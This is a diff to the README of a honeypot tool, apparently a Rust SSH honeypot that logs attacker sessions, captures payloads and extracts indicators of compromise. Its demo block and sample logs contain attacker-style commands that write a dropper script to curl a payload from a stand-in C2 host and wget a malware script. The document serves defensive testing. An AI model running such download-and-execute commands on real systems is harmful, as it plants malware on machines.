@@ -103,7 +103,7 @@ source ~/.cargo/env
 
 ```bash
 # Clone repository
-git clone https://github.com/yourusername/aegis-honeypot.git
+git clone https://github.com/aegis-honeypot/aegis-honeypot.git
 cd aegis-honeypot
 
 # Build all workspace crates
@@ -127,7 +127,7 @@ Try common attacker commands:
 root@ubuntu-server-01:~# uname -a
 root@ubuntu-server-01:~# cat /etc/os-release
 root@ubuntu-server-01:~# mkdir -p /tmp/botnet
-root@ubuntu-server-01:~# echo '#!/bin/bash\ncurl http://evil-c2.net/payload.bin' > /tmp/botnet/dropper.sh
+root@ubuntu-server-01:~# echo '#!/bin/bash\ncurl http://c2.example.com/payload.bin' > /tmp/botnet/dropper.sh
 root@ubuntu-server-01:~# wget http://example.com/malware.sh
 root@ubuntu-server-01:~# exit
 ```
@@ -143,7 +143,7 @@ All activity is recorded in real time as JSON Lines in `attacks.json`:
 {"event":"SESSION_START","timestamp":"2026-08-28T03:38:15Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","port":54156}
 {"event":"COMMAND_RUN","timestamp":"2026-08-28T03:38:16Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","command":"uname -a"}
 {"event":"COMMAND_RUN","timestamp":"2026-08-28T03:38:17Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","command":"mkdir -p /tmp/botnet"}
-{"event":"PAYLOAD_CAPTURED","timestamp":"2026-08-28T03:38:20Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","source_url":"http://evil-c2.net/payload.bin","sha256":"b875f928546aee7855cb1db9afc8ab3f1a8a34d43de5bbd62f7076d7ba9f3917","size_bytes":1284,"quarantine_path":"./quarantine/b875f928546aee7855cb1db9afc8ab3f1a8a34d43de5bbd62f7076d7ba9f3917","file_type":"shell","iocs":{"strings_preview":["#!/bin/bash"],"ip_addresses":["198.51.100.99"],"urls":["http://evil-c2.net/payload.bin"],"base64_blobs":[],"monero_wallets":[]}}
+{"event":"PAYLOAD_CAPTURED","timestamp":"2026-08-28T03:38:20Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","source_url":"http://c2.example.com/payload.bin","sha256":"b875f928546aee7855cb1db9afc8ab3f1a8a34d43de5bbd62f7076d7ba9f3917","size_bytes":1284,"quarantine_path":"./quarantine/b875f928546aee7855cb1db9afc8ab3f1a8a34d43de5bbd62f7076d7ba9f3917","file_type":"shell","iocs":{"strings_preview":["#!/bin/bash"],"ip_addresses":["198.51.100.99"],"urls":["http://c2.example.com/payload.bin"],"base64_blobs":[],"monero_wallets":[]}}
 {"event":"SESSION_END","timestamp":"2026-08-28T03:38:20Z","session_id":"c6c1baee68c8","ip":"198.51.100.2","duration_secs":5.3}
 ```
 
@@ -170,7 +170,7 @@ When an attacker drops a dropper script, downloads a payload via `wget`/`curl`, 
 2. **IOC Extraction:** Indicators of Compromise are parsed on the fly (IPv4 addresses, URLs, C2 endpoints, base64 blobs, Monero wallet patterns).
 3. **Session Replay (`sessions/*.cast`):** Replay the exact terminal session using [Asciinema](https://asciinema.org/):
    ```bash
-   asciinema play sessions/<session_id>.cast
+   asciinema play sessions/session_id.cast
    ```
 
 ---
